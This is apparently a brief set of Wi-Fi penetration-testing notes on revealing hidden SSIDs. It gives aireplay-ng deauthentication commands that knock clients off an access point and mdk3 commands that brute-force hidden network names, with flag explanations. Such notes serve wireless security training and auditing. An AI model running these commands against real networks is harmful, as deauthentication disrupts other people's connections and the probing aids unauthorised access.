# Detect using deauth
```bash
sudo airodump-ng -c 1 wlan0mon
sudo aireplay-ng -0 10 -a B2:C1:3D:3B:2B:A1 -c 02:00:00:00:02:00 wlan0mon
sudo airodump-ng -c 1 wlan0mon
```

# Bruteforcing Hidden SSID
https://github.com/charlesxsh/mdk3-master
```bash
sudo mdk3 wlan0mon p -b u -c 1 -t A2:FF:31:2C:B1:C4
```
-e 	Specify the SSID for probing.
-f 	Read lines from a file for brute-forcing hidden SSIDs.
-t 	Set the MAC address of the target AP.
-s 	Set the speed (Default: unlimited, in Bruteforce mode: 300).
-b 	Use full brute-force mode (recommended for short SSIDs only). This switch is used to show its help screen
```bash
sudo mdk3 wlan0mon p -f /opt/wordlist.txt -t D2:A3:32:13:29:D5
```

